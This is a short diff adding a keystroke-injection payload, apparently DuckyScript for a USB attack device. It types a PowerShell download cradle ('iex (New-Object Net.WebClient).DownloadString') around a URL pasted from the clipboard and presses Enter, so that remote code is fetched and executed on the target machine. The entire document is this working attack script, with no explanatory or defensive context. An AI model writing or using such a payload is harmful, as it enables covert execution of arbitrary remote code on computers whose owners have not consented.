@@ -1,0 +1,8 @@
+DEFAULTCHARDELAY 15
+
+STRING iex (New-Object Net.WebClient).DownloadString("
+
+CTRL SHIFT v
+
+STRING ")
+ENTER
